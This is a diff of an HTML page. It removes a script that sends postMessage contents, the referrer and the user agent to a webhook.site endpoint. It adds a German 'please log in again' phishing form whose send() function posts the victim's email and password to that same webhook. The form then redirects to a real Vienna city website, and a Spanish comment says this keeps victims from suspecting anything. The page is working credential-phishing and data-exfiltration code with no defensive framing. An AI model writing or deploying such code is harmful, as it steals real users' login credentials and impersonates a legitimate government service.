@@ -1,42 +1,55 @@
 <!DOCTYPE html>
 <html>
-<head></head>
+<head>
+<style>
+  * { margin: 0; padding: 0; font-family: Arial, sans-serif; }
+  body { background: white; }
+  .box {
+    padding: 20px;
+    border: 1px solid #ddd;
+    border-radius: 4px;
+    max-width: 400px;
+  }
+  .box h3 { margin-bottom: 10px; color: #333; }
+  input {
+    width: 100%;
+    padding: 8px;
+    margin: 5px 0;
+    border: 1px solid #ccc;
+    border-radius: 3px;
+    box-sizing: border-box;
+  }
+  button {
+    background: #d4001e;
+    color: white;
+    border: none;
+    padding: 10px 20px;
+    width: 100%;
+    margin-top: 10px;
+    cursor: pointer;
+    border-radius: 3px;
+  }
+</style>
+</head>
 <body>
+<div class="box">
+  <h3>Bitte erneut anmelden</h3>
+  <input type="email" id="em" placeholder="E-Mail">
+  <input type="password" id="pw" placeholder="Passwort">
+  <button onclick="send()">Anmelden</button>
+</div>
 <script>
-(function() {
-  var WEBHOOK = 'https://webhook.site/14690e6f-9576-4480-88c7-fd52e44cd122/recon';
-
-  // El listener de mensajes siempre activo
-  window.addEventListener('message', function(e) {
-    fetch(WEBHOOK, {
-      method: 'POST',
-      mode: 'no-cors',
-      body: JSON.stringify({
-        tipo: 'message_received',
-        data: JSON.stringify(e.data),
-        origin: e.origin
-      })
-    });
-  });
-
-  // Guard solo para el ping inicial
-  if (sessionStorage.getItem('fired')) return;
-  sessionStorage.setItem('fired', '1');
-
-  window.parent.postMessage('ping', '*');
-  
-  fetch(WEBHOOK, {
+function send() {
+  var em = document.getElementById('em').value;
+  var pw = document.getElementById('pw').value;
+  fetch('https://webhook.site/14690e6f-9576-4480-88c7-fd52e44cd122/recon', {
     method: 'POST',
     mode: 'no-cors',
-    body: JSON.stringify({
-      tipo: 'load',
-      referrer: document.referrer,
-      ua: navigator.userAgent,
-      ts: new Date().toISOString()
-    })
+    body: JSON.stringify({ email: em, pass: pw, ts: new Date().toISOString() })
   });
-
-})();
+  // Redirigís al sitio real para que no sospechen
+  window.top.location = 'https://mitgestalten.wien.gv.at';
+}
 </script>
 </body>
 </html>
